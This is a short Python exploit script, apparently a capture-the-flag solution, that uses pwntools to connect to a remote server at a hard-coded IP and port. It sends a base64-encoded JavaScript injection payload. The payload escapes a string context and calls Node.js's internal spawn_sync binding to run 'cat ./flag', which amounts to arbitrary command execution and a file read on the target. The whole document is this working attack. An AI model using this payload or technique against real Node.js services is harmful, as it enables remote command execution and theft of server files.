from pwn import *
import base64


server = '193.148.168.30'
port = 6671


script = """!'hello\\\\";let result = process.binding(`spawn_sync`).spawn({ file: `cat`, args: [`cat`, `./flag`], stdio: [{ type: `pipe`, readable: true, writable: false }, { type: `pipe`, readable: false, writable: true }, { type: `pipe`, readable: false, writable: true },], }); let output = result.output[1].toString(); console.log(output)//'"""
payload = base64.b64encode(script.encode())

conn = remote(server, port)
print(conn.recvuntil(b'Please enter your base64 encoded JavaScript code for processing:\n').decode())
conn.sendline(payload)
print(payload.decode())
print(conn.recvuntil(b'Goodbye!').decode())
